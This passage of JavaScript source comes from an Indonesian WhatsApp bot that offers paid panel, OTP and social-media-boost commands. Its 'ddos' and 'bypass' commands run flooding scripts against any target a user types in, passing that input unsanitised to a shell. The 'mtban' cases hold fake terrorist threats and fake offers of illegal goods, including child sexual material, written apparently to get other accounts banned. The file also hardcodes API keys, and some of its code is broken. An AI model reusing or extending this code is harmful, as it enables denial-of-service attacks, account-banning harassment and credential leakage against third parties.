  	if (config.data.status == false) return reply(`*ADA YANG KURANG COCOK*\n_Anda bisa melaporkan ke owner bot_`)
  for (let r of config.data) {
    teks += `*•ID:* ${r.id}\n*•Apk:* ${r.name}\n*•Harga:* Rp ${r.price}\n*•Tersedia:* ${r.tersedia}\n-----------------------------\n\n`
    }
    reply(teks)
  } catch (error) {
    console.error('Error:', error);
    reply(JSON.stringify(error, null, '\t'));
  }
}
  break
  case 'negara':
  reply(`*--BERIKUT NEGARA YANG TERSEDIA--*
  
›  Indonesia
›  indo
›  malay
›  malaysia
›  russia
›  usa      `)
break
case 'cekapk': {
  if (isGroup) return reply(mess.OnlyPM)
  	if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: mess.OnlyUser, mentions: [global.ownerNumber, sender]}, { quoted: fkontak })
  let s = q.split('|')
  let a = s[0]
let n = s[1]
if (!a) return reply(`Gunakan kata command: ${prefix+command} Apk|Negara\nContoh: ${prefix+command} Whatsapp|Indonesia\n\n_Untuk Isian Apk, Mohon gunakan huruf besar di awal, seterusnya harus huruf kecil_\n\nUntuk cek negara yang tersedia ketik #negara`)
if (!n) return reply(`Gunakan kata command: ${prefix+command} Apk|Negara\nContoh: ${prefix+command} Whatsapp|Indonesia\n\n_Untuk Isian Apk, Mohon gunakan huruf besar di awal, seterusnya harus huruf kecil_\n\nUntuk cek negara yang tersedia ketik #negara`)
  const config = await fetchJson('https://otpku.com/api/json.php?api_key=' + apikeyOtpKu + '&action=services&country=' + n)
try {
if (config.data.status == false) return reply(`Layanan Tidak tersedia`)
  let x = false
  Object.keys(config.data).forEach((i) => {
    if (config.data[i].name == a){x = i}
  })
  reply(`*🍁BERIKUT LIST LAYANAN ${q.toUpperCase()}*\n*•ID:* ${config.data[x].id}\n*•Apk:* ${config.data[x].name}\n*•Harga:* Rp ${config.data[x].price}\n*•Tersedia:* ${config.data[x].tersedia}`)
} catch (error) {
    console.error('Error:', error);
    reply(JSON.stringify(error, null, '\t') + `\n\n_Silahkan Lapor Ke Owner jikalau ada masalah, ketik #owner untuk melaporkan_`);
  }
}
        break
            case 'ddos': case 'mix':{
                if (!q.includes(' ')) return reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
             reply(`*Bot Sedang Attack Tunggu Hasilnya*
• *Target* -> [ ${targetweb} ]
• *Time Attack* -> [ ${timeweb} ]`)
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          reply(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          reply(`Error: ${stderr}`);
          return;
        }
        reply(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
      });  
            }
            break
            case 'bypass': case 'methodbypassx':{
                if (!q.includes(' ')) return reply(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1)
                const rate = q.substring(q.lastIndexOf(' ') + 2)
                const thread = q.substring(q.lastIndexOf(' ') + 3)
             reply(`*Bot Sedang Attack Tunggu Hasilnya*
• *Target* -> [ ${targetweb} ]
• *Time Attack* -> [ ${timeweb} ]
• *rate* ->[ ${rate} ]
• *Thread* -> [ ${thread} ]`)
              exec(`Bypass-X.js ${targetweb} ${timeweb} ${rate} ${thread}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          reply(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          reply(`Error: ${stderr}`);
          return;
        }
        reply(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb},\n• Rate: ${rate},\n• Thread: ${thread}`);
      });  
            }
            break
case 'ddosmenu':{
let menuddos = `
> mix/ddos
> bypass/methodbypass
> methodhold`
DitzzXploit.sendMessage(from, {text: menuddos})
}
                break
case "hadiah":{
DitzzXploit.sendMessage(from, {text: `Hahahahahahahahahahahagagagagshahahahahahahahahahahahahahahahshshahshshah`}, {quoted: qbug})
 }
                break
case "troli": {
let troli = `======[ Berikut Troli/Kranjang Kami ]======
> _mtban1_
> _mtban2_
> _mtban3_
`
let but_menu = [
{ buttonId: '.menu', buttonText: {displayText: '️䳈 Mᴇɴᴜ'}, type: 1}
]
const react = {
        text: "Bentar Brow Lagi ambil data", // use an empty string to remove the reaction
        key: m.key
    }
DitzzXploit.sendMessage(from, react, { image: { url: './media/keranjang.jpg'}, caption: troli}, { quoted: qbug })
}
break
case "cek":{
let menuu = `========[ You Info ]========
Saldo : ${toRupiah(cekSaldo(sender, db_saldo))}
Nama : ${pushname}
Click Hare to Button !`
let sections = [{
title: 'List Menu',
highlight_label: 'All Menu Lists',
rows: [{
title: 'Menu Panel',
description: `Displays Panel Menu`, 
id: '.panelmenu'
},
{
title: 'Semuah menu',
description: `Menampilkan Seluruh menu`, 
id: '.allmenu'
},
{
title: 'Menu awal',
description: `Displays Menu`, 
id: '.menu'
},
{
title: 'Menu Domain',
description: `Displays Domain Menu`, 
id: '.domainmenu'
},
{
title: 'Menu Group',
description: `Displays Group Menu`, 
id: '.groupmenu'
},
{
title: 'Menu Other', 
description: "Displays the Other Menu", 
id: '.ddos'
}]
}]

let listMessage = {
    title: 'List Menu', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By KayyDev', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: DitzzXploit.decodeJid(DitzzXploit.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: menuu
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('Krocoanjg')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}\n`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/2396b22796cc175c80f28.jpg" } }, { upload: DitzzXploit.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Creator\",\"url\":\"https://wa.me/6283842671582\",\"merchant_url\":\"https://wa.me/6283842671582\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await DitzzXploit.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "profil-smm":{
if (cekUser2("id", sender) == null) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
let apikey_smm = "Io9gCb662oVXaSfk7Q9sxj9Qi"
let data = {
apikey: apikey_smm,
}
let fetch = (...args) => import('node-fetch').then(({
          default: fetch
        }) => fetch(...args))
fetch(`https://mrxpanel.com/api/profile`, {
method: 'POST',
body: JSON.stringify(data),
headers: {
'Content-Type': 'application/json'
}
})
          .then(response => response.json())
          .then((data) => {
	let successMessage = `*──••• 「 Profil Account Anda」 •••──*
 💦 full_name: ${data.data.full_name}
 💦 Username: ${data.data.username}_
 💦 Blance:  ${data.data.balance}
`
         DitzzXploit.sendMessage(from, { text: successMessage}, {quoted: hw})
})
}
break
case "ceksaldo-smm": {
if (cekUser2("id", sender) == null) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        let md5 = require('md5')
        let apikey_smm = "b9kWmKUnqNMBzl1H5WJlFUiJc"
        let fetch = (...args) => import('node-fetch').then(({
          default: fetch
        }) => fetch(...args))
        let data = {
          api_key: apikey_smm,
        }
        fetch(`https://mrxpanel.com/api/profile`, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {
              'Content-Type': 'application/json'
            }
          })
          .then(response => response.json())
          .then((data) => {
          let  anjir = `*── 「 SISA SALDO 」 ──*\n\n*_Saldo : ${data.data.balance}_*\n*_Full name : ${data.data.full_name}_*\n*_username : ${data.data.username}_*`
           DitzzXploit.sendMessage(from, { text: anjir }, { quoted:m})
          })
}
break;    
case "suntiksmm": {
if (cekUser2("id", sender) == null) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!text) return reply(`example .suntiksmm 25 https://youtube.com/shorts/z4tojQ3PmWY?feature=shared 100000`)
     let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 let apikeysmm = "Io9gCb662oVXaSfk7Q9sxj9Qi"
let jumlah = q.split(" ")[0]
let target = q.split(" ")[1]
let idny = q.split(" ")[2]
        let data = {
          api_key: apikeysmm,
          service: jumlah,
          target: target,
          quantity: idny,
        }
        fetch('https://mrxpanel.com/api/order', {
            method: 'POST',
            body: JSON.stringify(data),
            header: {
              'Content-Type': 'application/json'
            }
          }).then((response) => response.json())
          .then((res) => {
                if (res.data.message == 'Saldo Anda tidak cukup untuk melakukan pemesanan ini.') { 
            reply(res.data.message)
            }
                    if (res.data.message == 'Pesanan berhasil, pesanan akan diproses.') {
    let  cap = `*──••• 「 TRANSAKSI BERHASIL 」 •••──*

ID : ${res.data.id}

*_untuk cek transaksi silahkan ketik = .cektransaksi id_*`
         DitzzXploit.sendMessage(from, { caption: cap })
}
          
}
)}
break
case "cektransaksi":
case "cektrx": {
if (cekUser2("id", sender) == null) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!text) {
        let errorMessage = '⚠️ *Format salah!*\n\nContoh :\n_cektrx 11012_*';

        return   DitzzXploit.sendMessage(from, {text:errorMessage})
    }
    let [refid] = text.split(" ");
    let md5 = require('md5');
    let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
    let apikeysmm = "Io9gCb662oVXaSfk7Q9sxj9Qi"
    let data = {
          api_key: apikeysmm,
          id: refid,
    };
    let response = await fetch('https://mrxpanel.com/api/status', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    });
    let result = await response.json();
if (result.status == false) {
  reply(`\n\nPermasalahan :\n${result.data.message} `)
} else {
	let successMessage = `*──••• 「 STATUS TRANSAKSI 」 •••──*

_🆔Tujuan: ${result.data.target}_
_✨ Hrga : ${result.data.price}_
_🧾 Waktu : ${result.data.start_count}_
_📝 Jumblah  : ${result.data.remains}_
_🔢 Status_ : ${result.data.status}
`;

       DitzzXploit.sendMessage(from, {text:successMessage})
}
}
break
case 'smmlist':{
if (cekUser("id", sender) == null) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        let md5 = require('md5')
        let smmkey = "Io9gCb662oVXaSfk7Q9sxj9Qi"
        let data = {
          api_key: smmkey,        }
        fetch(`https://mrxpanel.com/api/services`, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {
              'Content-Type': 'application/json'
            }
          })
          .then(response => response.json())
          .then((data) => {
var teks = '*List Layanan*\n\n'
teks +=`🆔 id: ${x.id}\n🧨Nama : ${x.name}\n🛒 Kategori : ${x.category}\n💸Price : Rp${x.price}\n📔Deks : ${x.description}\n🦕Type : ${x.type}\n🎈Min Order : ${x.min}\n🌼Max Order : ${x.max}\n Stok : ${x.status}\n\n`
reply(teks)
})
}
break
case "deposit-smm":
case "smm": {
if (cekUser2("id", sender) == null) return DitzzXploit.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
      let apikeysmm = "Io9gCb662oVXaSfk7Q9sxj9Qi"
    let md5 = require('md5');
    let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));;
    let data = {
        api_key: apikeysmm,
    };
    let response = await fetch('https://mrxpanel.com/api/services', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    });
    let result = await response.json();
	      if (result.status == false) {
  reply(`*Maaf orderan gagal di buat*\n\nPermasalahan :\n${result.data.message} atau Cara order anda salah\n\nDiharapkan sudah faham jika ingin membeli\njika masih tidak faham silahkan ketik ${prefix}owner!\n`)
} else {
	let successMessage = `LIST

📝 ID : _${result.data.id}_

*_UNTUK MELIHAT TRX ID SILHAKAN KETIK trx!!._*`;

   DitzzXploit.sendMessage(from, {text:successMessage})
}}
break
case "mtban1":{
const mtban1 = `Olá, sou Ditzz Zuckerberg, sou um terrorista da Indonésia, vou te matar nos Estados Unidos (EUA), mirando na sua cabeça Mark Zuckerberg 👿, se você não quer ser morto então você você tem que entrar em contato comigo pelo aplicativo WhatsApp 🔪👇
https://api.whatsapp.com/send?phone=+62`
await reply(Styles(mtban1));
}
break
case "mtban2":{
let msg = `Eu vendo itens ilegais, como 👇
Drogas
Armas de fogo
Órgãos humanos 👿
Vagina de mulher 
Vídeo pornô 🔞
Crianças sexuais 👿

Se quiser encomendar, entre em contato comigo no WhatsApp 👿👇
https://api.whatsapp.com/send?phone=+62`
let but_menu = [
{ buttonId: '.mtban1', buttonText: {displayText: '️䳈 Method Banned 1'}, type: 1},
{ buttonId: '.mtban3', buttonText: {displayText: '️䳈 Method Banned 3'}, type: 1},
{ buttonId: '.mtban4', buttonText: {displayText: '️䳈 Method Banned 4'}, type: 1},
{ buttonId: '.mtban5', buttonText: {displayText: '️䳈 Method Banned 5'}, type: 1},
{ buttonId: '.menu', buttonText: {displayText: '️䳈 Menu'}, type: 1}
]
const react = {
        text: "Bentar Brow Lagi ambil data", // use an empty string to remove the reaction
        key: m.key
    }
DitzzXploit.sendMessage(from, react, { image: { url: './media/keranjang.jpg'}, caption: ms}, { quoted: hw })
}
break
case "mtban3":{
let msg = `olá, eu sou o terrorista que recebeu ordens de Ditzz Zuckerberg, para matar você Mark Zuckerberg 🔪👿.
https://api.whatsapp.com/send?phone=+62`
let but_menu = [
{ buttonId: '.mtban1', buttonText: {displayText: '️䳈 Method Banned 1'}, type: 1},
{ buttonId: '.mtban2', buttonText: {displayText: '️䳈 Method Banned 2'}, type: 1},
{ buttonId: '.mtban4', buttonText: {displayText: '️䳈 Method Banned 4'}, type: 1},
{ buttonId: '.mtban5', buttonText: {displayText: '️䳈 Method Banned 5'}, type: 1},
{ buttonId: '.menu', buttonText: {displayText: '️䳈 Menu'}, type: 1}
]
const react = {
        text: "Bentar Brow Lagi ambil data", // use an empty string to remove the reaction
        key: m.key
    }
DitzzXploit.sendMessage(from, react, { image: { url: './media/keranjang.jpg'}, caption: msg}, { quoted: hw })
}
break
case 'menu2':
let mssggg = generateWAMessageFromContent(m.from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "*CLICK THE BUTTON BELOW TO VIEW THE MENU*"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "© BokepMd"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: `👋Hallo Kak *${pushname}*

Kenalin Aku Kroco-Botz Aku Adalah Sebuah Bot Whatsapp Yang Di Buat Oleh Creator Saya Yaitu DitzzXploit. Saya Di Progam Untuk Kebutuhan Owner Saya Seperti Create Panel Dan Lain Lainnya Jadi Kalau Mau Sewa Chat Owner Saya Saja *Terimakasih😇*

╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌

 乂  *ꜱ ᴛ ᴀ ᴛ ɪ ꜱ ᴛ ɪ ᴄ*

> ◦ *Name Creator : Zoro Xd*
> ◦ *Nama Bot : Zoro - BoTz*
> ◦ *Creator : 6283876003588*

╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
ʜɪ sɪs, ʙᴇғᴏʀᴇ ɢᴏɪɴɢ ᴛᴏ ᴛʜᴇ ғᴇᴀᴛᴜʀᴇs ᴍᴇɴᴜ, ᴘʟᴇᴀsᴇ ʀᴇᴀᴅ ᴛʜᴇ ʀᴜʟᴇs ғᴏʀ ᴜsɪɴɢ ᴛʜᴇ ʙᴏᴛ 

𝟷. sᴘᴀᴍ ʙᴏᴛs ᴀʀᴇ ᴘʀᴏʜɪʙɪᴛᴇᴅ
𝟸. ᴄᴀʟʟɪɴɢ ʙᴏᴛs ɪs ᴘʀᴏʜɪʙɪᴛᴇᴅ
𝟹. ᴄᴀʟʟɪɴɢ ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ ɪs ᴘʀᴏʜɪʙɪᴛᴇᴅ
𝟺. sᴘᴀᴍ ᴛᴏ ɴᴏ ᴏᴡɴᴇʀ ɪs ᴘʀᴏʜɪʙɪᴛᴇᴅ

╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
-----  -----  -----  ----  ----  ----  ----
`,
            subtitle: `p`,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
               {
                "name": "single_select",
                "buttonParamsJson": "{\"title\":\"Silakan Klick\",\"sections\":[{\"SanzMD\":\"title\",\"highlight_label\":\"AllMenu\",\"rows\":[{\"header\":\"MENU\",\"title\":\"ALLMENU\",\"description\":\"MENAMPILKAN SEMUA MENU\",\"id\":\".allmenu\"},{\"header\":\"SCRIPT\",\"title\":\"Owner Number\",\"description\":\"ownerNumber\",\"id\":\".owner\"},{\"header\":\"SCRIPT\",\"title\":\"PM2 File\",\"description\":\"Get Pm 2 Feature\",\"id\":\".getpm2\"}]}]}"
              }
           ],
          })
        })
    }
  }
}, {})

return DitzzXploit.relayMessage(m.key.remoteJid, mssggg.message, {
  messageId: m.key.id
})
break
case "allmenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
const owned = `6281802527761@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*

_I Am *PiwBotzz* Made By DitzzXploit Official_
_If There Is An Error!!_
_Please Report To Developer_
_Berikut Saldo anda_ Rp: ${toRupiah(cekSaldo(sender, db_saldo))}
▭▬▭▬▭▬▭▬▭▬▭▬▭▬
「 *BOT INFO* 」
⭔Nama Creator : *${namaCreator}*
⭔Nomor Creator : *@${owned.split("@")[0]}*
⭔Nama Script : *${global.namasc}*
⭔Versi Script : *${global.versisc}*
⭔Type Baileys : *Multi-device*

*RUNTIME*
${runtime(process.uptime())}
▭▬▭( *OWNER MENU* )▭▬▭

⭔ ${prefix}addowner *nomor*
⭔ ${prefix}delowner *nomor*
⭔ ${prefix}addprem *nomor*
⭔ ${prefix}delprem *nomor*
⭔ ${prefix}setbotname *teks*
⭔ ${prefix}setbotbio *teks*
⭔ ${prefix}accreport
⭔ ${prefix}sosmed
⭔ ${prefix}leave
⭔ ${prefix}sewabot
⭔ ${prefix}creategc *teksgc*
⭔ ${prefix}sdomain/sendomain
⭔ ${prefix}spanel/sendpanel
⭔ ${prefix}svps/sendvps
⭔ ${prefix}public *on/off*
⭔ ${prefix}self *on/off*
⭔ ${prefix}unblock
⭔ ${prefix}block

▭▬▭( *PANEL MENU* )▭▬▭

⭔${prefix}panel
⭔${prefix}listusr
⭔${prefix}delusr
⭔${prefix}listsrv
⭔${prefix}delsrv
⭔${prefix}tutorial
⭔${prefix}ramlist
⭔${prefix}premlist
⭔${prefix}addusr
⭔${prefix}addsrv
⭔${prefix}updatesrv
⭔${prefix}suspend *id*
⭔${prefix}unsuspend *id*
⭔${prefix}crateadmin
⭔${prefix}listadmin
⭔${prefix}buysewa
⭔${prefix}sewa

▭▬▭( *EGG REGULAR* )▭▬▭

.1gb [username,nomor]
.2gb [username,nomor]
.3gb [username,nomor]
.4gb [username,nomor]
.5gb [username,nomor]
.6gb [username,nomor]
.7gb [username,nomor]
.8gb [username,nomor]
.unli [username,nomor]

▭▬▭( *EGG PM2* )▭▬▭

.srv21gb [username,nomor]
.srv22gb [username,nomor]
.srv23gb [username,nomor]
.srv24gb [username,nomor]
.srv2unli [username,nomor]

▭▬▭( *BUG MENU* )▭▬▭

⭔ ${prefix}bannedmenu
⭔ ${prefix}unbanmenu
⭔ ${prefix}reportbug

▭▬▭( *MENU GROUP* )▭▬▭

⭔ ${prefix}owner
⭔ ${prefix}qc *teks*
⭔ ${prefix}tts *teks*
⭔ ${prefix}sticker *reply image*
⭔ ${prefix}linkgroup
⭔ ${prefix}hidetag *teks*
⭔ ${prefix}setppbot *teks*
⭔ ${prefix}setppgroup *teks*
⭔ ${prefix}delppgc
⭔ ${prefix}add *nomor*
⭔ ${prefix}kick *nomor*
⭔ ${prefix}promote *nomor*
⭔ ${prefix}demote *nomor*
⭔ ${prefix}promoteall *nomor*
⭔ ${prefix}demoteall *nomor*
⭔ ${prefix}antilink *on/off*

▭▬▭( *MENU PUSHKONTAK* )▭▬▭

⭔ ${prefix}cekidgc
⭔ ${prefix}listgroup
⭔ ${prefix}pushkontakv1 *idgc|teks*
⭔ ${prefix}pushkontakv2 *teks*
⭔ ${prefix}pushkontakv3 *idgroup|jeda|teks*
⭔ ${prefix}pushkontakv4 *jeda|teks*
⭔ ${prefix}savecontactv1 *idgroup*
⭔ ${prefix}savecontactv2 *teks*
⭔ ${prefix}savekontak *teks*
⭔ ${prefix}getcontact *teks*
⭔ ${prefix}sendkontak *teks*
⭔ ${prefix}bcvideo *teks*
⭔ ${prefix}bcgc *teks*
⭔ ${prefix}jpm *teks*

▭▬▭( *MENU BANNED* )▭▬▭

⭔ ${prefix}call *nomor*
⭔ ${prefix}out *nomor*
⭔ ${prefix}verif *nomor*
⭔ ${prefix}kenon *nomor*
⭔ ${prefix}bannedv1 *nomor*
⭔ ${prefix}bannedv2 *nomor*
⭔ ${prefix}bannedv3 *nomor*
⭔ ${prefix}bannedv4 *nomor*
⭔ ${prefix}bannedv5 *nomor*
⭔ ${prefix}bannedv6 *nomor*

▭▬▭( *MENU UNBANNED* )▭▬▭

⭔ ${prefix}unbannedv1 *nomor*
⭔ ${prefix}unbannedv2 *nomor*
⭔ ${prefix}unbannedv3 *nomor*
⭔ ${prefix}unbannedv4 *nomor*
⭔ ${prefix}unbannedv5 *nomor*
⭔ ${prefix}unbannedv6 *nomor*

▬▭( *ALL OTOMATIS* )▭▬

⭔ ${prefix}buysc
⭔ ${prefix}buyakn
⭔ ${prefix}buyvps
⭔ ${prefix}buysrv 
⭔ ${prefix}deposit
⭔ ${prefix}buyprem
⭔ ${prefix}buyowner
⭔ ${prefix}adminpanel
⭔ ${prefix}cekharga
⭔ ${prefix}payment
⭔ ${prefix}donasi
⭔ ${prefix}jasa
⭔ ${prefix}vps
⭔ ${prefix}addcase

▬▭( *MENU KUDETA* )▭▬▭

⭔ ${prefix}allkudet
⭔ ${prefix}kudet

▬▭( *LIST MENU* )▭▬▭

⭔ ${prefix}listvps1

▭▬▭( *RANDOM CECAN* )▭▬▭

⭔ ${prefix}randomcecan1
⭔ ${prefix}randomcecan2
⭔ ${prefix}randomcecan3
⭔ ${prefix}randomcecan4
⭔ ${prefix}randomcecan5
⭔ ${prefix}randomcecan6
⭔ ${prefix}randomcecan7
⭔ ${prefix}randomcecan8
⭔ ${prefix}randomcecan9
⭔ ${prefix}randomcecan10

▭▬▭( *LINODE MENU* )▭▬▭

⭔ ${prefix}resetpassword
⭔ ${prefix}deletelinode
⭔ ${prefix}listlinode
⭔ ${prefix}onlinode
⭔ ${prefix}offlinode
⭔ ${prefix}rebootlinode
⭔ ${prefix}sisalinode
⭔ ${prefix}rebuildlinode
⭔ ${prefix}saldolinode
⭔ ${prefix}cekvps
⭔ ${prefix}linode2gb
⭔ ${prefix}linode4gb
⭔ ${prefix}linode8gb

▭▬▭( *SC MENU* )▭▬▭


 ⭔${prefix}buyscbugv1
 ⭔${prefix}buyscbugv2
 ⭔${prefix}buyscbugv3
 ⭔${prefix}buyscv2
 ⭔${prefix}buyscv3
 ⭔${prefix}buyscv3subdo
 ⭔${prefix}buyscv4
 ⭔${prefix}buyscv5
 ⭔${prefix}buyscv6
 ⭔${prefix}buyscv6subdo
 ⭔${prefix}buyscv7otp
 ⭔${prefix}buyscv7addpm2
 ⭔${prefix}buyscjagagrupv1
 ⭔${prefix}buyscjagagrupv2
 ⭔${prefix}buyscpushkontak
 ⭔${prefix}buyschwv191
 ⭔${prefix}buyschwv192
 ⭔${prefix}buyschwv201
 ⭔${prefix}buyschwv202
 ⭔${prefix}buyscpanel
 ⭔${prefix}buyscpushautosave
 ⭔${prefix}buyscjpmv1
 ⭔${prefix}buyscjpmv2
 ⭔${prefix}buyscjpmv3
 ⭔${prefix}buyscvps1
 ⭔${prefix}buyscvps2
 ⭔${prefix}buyscpm2
 ⭔${prefix}buyscthemav1
 ⭔${prefix}buyscthemav2
 ⭔${prefix}buyscnowa
 ⭔${prefix}buyscwebp
 ⭔${prefix}buysctesmoni
 ⭔${prefix}buyscddos
 ⭔${prefix}buymodule
 ⭔${prefix}buyscbukaenc

▭▬▭( *TEXT MENU* )▭▬▭

● ${prefix}fakec1
● ${prefix}fakec2
● ${prefix}fakec3
● ${prefix}fakec4
● ${prefix}fakec5
● ${prefix}fakec6
● ${prefix}fakec7
● ${prefix}fakec8
● ${prefix}fakec9
● ${prefix}fakec10
● ${prefix}fakec11
● ${prefix}textunbanv1
● ${prefix}textunbanv2
● ${prefix}textunbanv3
● ${prefix}textunbanv4
● ${prefix}textunbanv5
● ${prefix}textunbanv6
● ${prefix}textunbanv7
● ${prefix}textunbanv8
● ${prefix}textunbanv9
● ${prefix}textunbanv10
● ${prefix}textunbanv11
● ${prefix}textunbanv12
● ${prefix}textunbanv13
● ${prefix}textunbanv14
● ${prefix}textunbanv15
● ${prefix}textunbanv16
● ${prefix}textunbanv17
● ${prefix}textunbanv18
● ${prefix}textunbanv19
● ${prefix}textunbanv20
● ${prefix}textunbanv21
● ${prefix}textbanv1
● ${prefix}textbanv2
● ${prefix}textbanv3
● ${prefix}textbanv4
● ${prefix}textbanv5
● ${prefix}textbanv6
● ${prefix}textbanv7
● ${prefix}textbanv8
● ${prefix}textbanv9
● ${prefix}textbanv10
● ${prefix}textbanv11
● ${prefix}textbanv12
● ${prefix}textbanv13
● ${prefix}textbanv14
● ${prefix}textbanv15
● ${prefix}textbanv16
● ${prefix}textbanv17
● ${prefix}textbanv18
● ${prefix}textbanv19
● ${prefix}textbanv20
● ${prefix}textbanv21
● ${prefix}textbanv22
● ${prefix}textbanv23
● ${prefix}textbanv24
● ${prefix}textbanv25
● ${prefix}textbanv26
● ${prefix}textbanv27
● ${prefix}textbanv28
● ${prefix}textbanv29
● ${prefix}textbanv30
● ${prefix}textbanv31
● ${prefix}textbanv32
● ${prefix}textbanv33
● ${prefix}textbanv34
● ${prefix}textbanv35
● ${prefix}textbanv36
● ${prefix}textbanv37
● ${prefix}textbanv38
● ${prefix}textunbanpremv1
● ${prefix}textunbanpremv2
● ${prefix}textunbanpremv3

▬▭( *ALL OTOMATIS* )▭▬

⭔ ${prefix}dana
⭔ ${prefix}gopay ( Sedang Proses )
⭔ ${prefix}orkut
⭔ ${prefix}qris
⭔ ${prefix}bri

▭▬▭( *ADMIN PANEL* )▭▬▭

⭔${prefix}buyadminpanel
⭔${prefix}panelprem

▭▬▭( *STORE MENU* )▭▬▭

⭔ ${prefix}done
⭔ ${prefix}batal
⭔ ${prefix}tunda
⭔ ${prefix}proses
⭔ ${prefix}reqvps
⭔ ${prefix}reqpanel

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/ded6d9da764a487ae9d9a.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})    

} freya = fs.readFileSync('./freya/audio1.mp3')
DitzzXploit.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})

break 
        case "panelmenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *PANEL MENU* )▭▬▭

⭔${prefix}panel
⭔${prefix}listusr
⭔${prefix}delusr
⭔${prefix}listsrv
⭔${prefix}delsrv
⭔${prefix}tutorial
⭔${prefix}ramlist
⭔${prefix}premlist
⭔${prefix}addusr
⭔${prefix}addsrv
